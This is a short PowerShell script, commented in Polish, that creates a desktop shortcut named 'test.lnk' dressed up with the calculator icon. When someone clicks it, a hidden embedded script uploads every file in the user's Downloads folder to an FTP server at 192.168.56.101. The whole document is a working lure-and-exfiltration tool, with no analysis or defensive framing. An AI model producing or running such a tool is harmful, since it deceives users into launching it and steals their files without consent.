# Ścieżka do lokalizacji, w której zostanie utworzony skrót
$shortcutLocation = "$env:USERPROFILE\Desktop\test.lnk"

# Zaszyfrowany skrypt PowerShell, który będzie uruchamiany
$script = @'
# Połączenie z FTP
$ftpServer = "ftp://192.168.56.101"
$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
$localFolder = "C:\Users\$username\Downloads"
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous")

$files = Get-ChildItem -Path $localFolder

foreach ($file in $files) {
    $ftpFilePath = "$ftpServer/uploads/$($file.Name)"  # Poprawne użycie cudzysłowów
    try {
        $localFilePathWithUser = "$localFolder\$($file.Name)"  # Poprawne użycie cudzysłowów
        $client.UploadFile($ftpFilePath, "STOR", $localFilePathWithUser)  # "STOR" ujęte w cudzysłowy
        Write-Host "Przesłano plik: $($file.Name)"
    } catch {
        Write-Host "Wystąpił błąd podczas przesyłania pliku: $($_.Exception.Message)"
    }
}
'@

# Tworzenie obiektu WScript.Shell
$WshShell = New-Object -ComObject WScript.Shell

# Tworzenie skrótu
$shortcut = $WshShell.CreateShortcut($shortcutLocation)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-NoProfile -NoExit -Command `"$script`""  # Uruchomienie skryptu z otwartą konsolą
$shortcut.IconLocation = "C:\Windows\System32\calc.exe" # Ikona kalkulatora
$shortcut.Save()

Write-Host "Skrót został utworzony na pulpicie jako test.lnk"
